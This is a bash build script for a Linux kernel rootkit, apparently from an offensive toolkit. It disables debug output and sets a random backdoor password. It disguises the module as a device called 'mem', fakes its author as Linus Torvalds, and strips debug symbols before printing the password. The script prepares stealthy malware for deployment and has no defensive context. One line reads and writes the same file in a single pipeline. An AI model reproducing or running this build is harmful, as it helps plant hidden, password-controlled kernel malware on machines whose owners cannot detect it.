#!/bin/env bash

outdir="build/"
password_len=12
password="$(openssl rand -hex $password_len)"
device_name="mem"

rm -rf "$outdir"
mkdir -p "$outdir"

cp rootkit.c "$outdir"
cp Makefile "$outdir"

sed -i "s/#define DEBUG .*/#define DEBUG 0/g" "$outdir/rootkit.c"
sed -i "s/MODULE_AUTHOR(\".*\")/MODULE_AUTHOR(\"Linus Torvalds\")/g" "$outdir/rootkit.c"
sed -i "s/RK_PASSWORD \".*\"/RK_PASSWORD \"$password\"/g" "$outdir/rootkit.c"
sed -i "s/RK_PASSWORD_LEN .*/RK_PASSWORD_LEN $(($password_len * 2))/g" "$outdir/rootkit.c"
sed -i "s/RK_DEVICE_NAME \".*\"/RK_DEVICE_NAME \"$device_name\"/g" "$outdir/rootkit.c"

mv "$outdir/rootkit.c" "$outdir/$device_name.c"
sed -i "s/obj-m += rootkit.o/obj-m += $device_name.o/g" "$outdir/Makefile"
unifdef -UDEBUG "$outdir/$device_name.c" | tee "$outdir/$device_name.c"
cd "$outdir" && make && cd -
strip --strip-debug "$outdir/$device_name.ko"

echo "password: $password" > "$outdir/config.txt"

echo "Your rootkit password is: $password"
